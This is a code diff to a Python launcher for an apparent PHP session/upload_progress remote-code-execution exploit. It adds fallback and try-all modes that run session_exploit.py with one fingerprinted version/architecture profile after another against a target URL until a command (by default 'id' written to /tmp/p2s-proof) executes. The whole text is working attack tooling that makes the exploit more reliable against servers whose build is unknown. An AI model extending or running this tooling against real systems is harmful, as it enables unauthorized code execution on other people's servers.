@@ -32,6 +32,7 @@ from profile_db import (
     load_profile,
     match_profiles,
     normalize_arch,
+    priority_candidates,
     profile_command,
     profile_requirements_ok,
     recommended_huge_mb,
@@ -416,6 +417,12 @@ def main() -> int:
     ap.add_argument("--limit", type=int, default=8)
     ap.add_argument("--run", action="store_true",
                     help="run session_exploit.py with the selected profile")
+    ap.add_argument("--fallback", action="store_true",
+                    help="try the priority profile queue when the exact build is unknown")
+    ap.add_argument("--try-all", action="store_true",
+                    help="try every runnable profile in priority order")
+    ap.add_argument("--max-attempts", type=int, default=4,
+                    help="maximum profiles tried with --fallback")
     ap.add_argument("-c", "--cmd", default="id>/tmp/p2s-proof")
     ap.add_argument("--proof-file", default="/tmp/p2s-proof")
     args = ap.parse_args()
@@ -495,30 +502,61 @@ def main() -> int:
             print("  " + row)
 
     if args.run:
-        try:
-            chosen = _choose_profile(args, matches)
-        except SystemExit as exc:
-            print(f"[-] {exc}", file=sys.stderr)
-            return 1
-        huge = recommended_huge_mb(chosen, fp.get("memory_limit"))
-        command = profile_command(chosen, args.url, args.cmd,
-                                  args.proof_file, huge_mb=huge)
-        print("[*] running:", " ".join(command), flush=True)
-        try:
-            Path(args.proof_file).unlink()
-        except OSError:
-            pass
-        try:
-            rc = subprocess.run(command).returncode
-        except OSError as exc:
-            print(f"[-] could not launch exploit: {exc}", file=sys.stderr)
-            return 1
-        if Path(args.proof_file).is_file():
-            print("[+] proof file:", args.proof_file)
-            print(Path(args.proof_file).read_text(errors="replace").strip())
-            return 0
-        print(f"[-] exploit exited {rc}; no proof file at {args.proof_file}",
-              file=sys.stderr)
+        if args.profile:
+            try:
+                candidates = [load_profile(args.profile)]
+                ok, problems = profile_requirements_ok(candidates[0])
+                if not ok:
+                    raise ValueError("; ".join(problems))
+            except (ValueError, SystemExit) as exc:
+                print(f"[-] profile: {exc}", file=sys.stderr)
+                return 1
+        elif args.fallback or args.try_all:
+            candidates = priority_candidates(fp, arch=arch)
+            if args.try_all:
+                cap = len(candidates)
+            else:
+                cap = max(1, args.max_attempts)
+            candidates = candidates[:cap]
+            if not candidates:
+                print("[-] no runnable fallback profiles: known patched version, "
+                      "non-mod_php SAPI, disabled upload_progress, multi-worker "
+                      "target, or no complete RCE profile", file=sys.stderr)
+                return 1
+            print("[*] fallback priority:")
+            for i, candidate in enumerate(candidates, 1):
+                print(f"  {i}. {candidate['name']} ({candidate['php_version']}/"
+                      f"{candidate['arch']})")
+        else:
+            try:
+                chosen = _choose_profile(args, matches)
+            except SystemExit as exc:
+                print(f"[-] {exc}", file=sys.stderr)
+                return 1
+            candidates = [chosen]
+
+        for index, chosen in enumerate(candidates, 1):
+            huge = recommended_huge_mb(chosen, fp.get("memory_limit"))
+            command = profile_command(chosen, args.url, args.cmd,
+                                      args.proof_file, huge_mb=huge)
+            print(f"[*] attempt {index}/{len(candidates)}: {chosen['name']} "
+                  f"(huge_mb={huge})", flush=True)
+            print("[*] running:", " ".join(command), flush=True)
+            try:
+                Path(args.proof_file).unlink()
+            except OSError:
+                pass
+            try:
+                rc = subprocess.run(command).returncode
+            except OSError as exc:
+                print(f"[-] could not launch exploit: {exc}", file=sys.stderr)
+                return 1
+            if Path(args.proof_file).is_file():
+                print("[+] proof file:", args.proof_file)
+                print(Path(args.proof_file).read_text(errors="replace").strip())
+                return 0
+            print(f"[-] attempt {index} exited {rc}; no proof at "
+                  f"{args.proof_file}", file=sys.stderr)
         return 1
     return 0
 
